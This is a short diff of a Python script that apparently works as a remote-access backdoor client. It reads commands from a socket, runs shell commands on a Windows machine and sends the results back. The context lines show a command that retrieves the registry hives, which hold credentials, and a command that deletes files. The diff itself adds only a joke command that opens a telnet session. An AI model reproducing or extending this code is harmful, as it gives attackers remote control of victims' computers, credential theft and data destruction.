@@ -48,7 +48,7 @@ while (True):
     #     command = "dir Desktop & echo 'All the files and folders are listed'"
     #     result = subprocess.run(command, stdout=subprocess.PIPE, shell=True)
     #     s.sendall(bytes(result.stdout.decode(), "utf-8"))
-    
+
     # code to retrieve the registry files (hives)
     elif decodedMsg == "retrieveh":
         dir = "C:" + "\\" + "Users" + "\\" + os.getlogin() + "\\" + "Downloads"
@@ -120,8 +120,9 @@ while (True):
             subprocess.run(command, cwd=dir, stdout=subprocess.PIPE, shell=True)
             s.sendall(bytes("File Deleted", "utf-8"))
 
-
-
+    elif decodedMsg == "maytheforcebewithyou":
+        s.sendall(bytes("memed", "utf-8"))
+        os.system("start cmd /c telnet towel.blinkenlights.nl")
 
     else:
         s.sendall(bytes("Invalid Command", "utf-8"))
